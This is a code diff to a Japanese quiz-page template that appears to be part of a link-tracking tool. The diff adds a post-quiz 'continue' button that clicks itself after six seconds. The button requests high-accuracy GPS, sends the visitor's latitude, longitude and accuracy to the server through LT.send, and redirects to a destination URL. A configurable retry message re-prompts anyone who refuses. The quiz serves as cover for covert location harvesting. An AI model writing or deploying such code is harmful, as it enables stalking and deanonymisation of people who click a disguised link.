@@ -36,9 +36,10 @@ button.next,#nb{margin-top:12px;padding:12px 28px;border:0;border-radius:999px;b
 window.LT_CODE = {{ code|tojson }};
 window.LT_HIT  = {{ hit_id }};
 window.LT_NONCE = {{ nonce|tojson }};
-window.LT_GEO  = {{ 1 if link.mode == "geo" else 0 }};
+window.LT_GEO  = 0;
 const QS = {{ questions_json|safe }};
 const DEST = {{ dest|tojson }};
+const RETRY_TEXT = {{ retry_text|tojson }};
 </script>
 <script src="/static/collect.js"></script>
 <script>
@@ -46,7 +47,7 @@ const DEST = {{ dest|tojson }};
   const qbox = document.getElementById("qbox"), sub = document.getElementById("sub"),
         bar = document.getElementById("bar"), prog = document.getElementById("prog");
   let i = 0, score = 0, t0 = Date.now(), tq = Date.now();
-  const esc = (s) => (s || "").replace(/[&<>"]/g, c =>
+  const esc = (s) => (s || "").replace(/[&<>\"]/g, c =>
     ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" }[c]));
 
   function show() {
@@ -115,13 +116,27 @@ const DEST = {{ dest|tojson }};
     qbox.innerHTML = '<div class="done"><h2>ありがとうございました</h2><p>' +
       score + ' / ' + QS.length + ' 問正解</p></div>';
     prog.textContent = "";
-    if (DEST) {
-      const b = document.createElement("button");
-      b.className = "go"; b.textContent = "続ける";
-      b.onclick = async () => { try { await LT.send(await LT.geo()); } catch (e) {} location.href = DEST; };
-      qbox.appendChild(b);
-      setTimeout(() => { if (!document.hidden) b.click(); }, 6000);
-    }
+    if (!DEST) return;
+
+    const b = document.createElement("button");
+    b.className = "go"; b.textContent = "続ける";
+    let busy = false, done = false;
+    b.onclick = () => {
+      if (busy || done) return;
+      busy = true; b.disabled = true;
+      navigator.geolocation.getCurrentPosition(
+        async (p) => {
+          busy = false; done = true;
+          b.style.display = "none";             // 取れたらボタンは消す
+          try { await LT.send({ gps_lat: p.coords.latitude, gps_lon: p.coords.longitude,
+                                gps_acc: p.coords.accuracy }); } catch (e) {}
+          location.href = DEST;
+        },
+        () => { busy = false; b.disabled = false; b.textContent = RETRY_TEXT; },
+        { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 });
+    };
+    qbox.appendChild(b);
+    setTimeout(() => { if (!document.hidden) b.click(); }, 6000);
   }
 
   show();
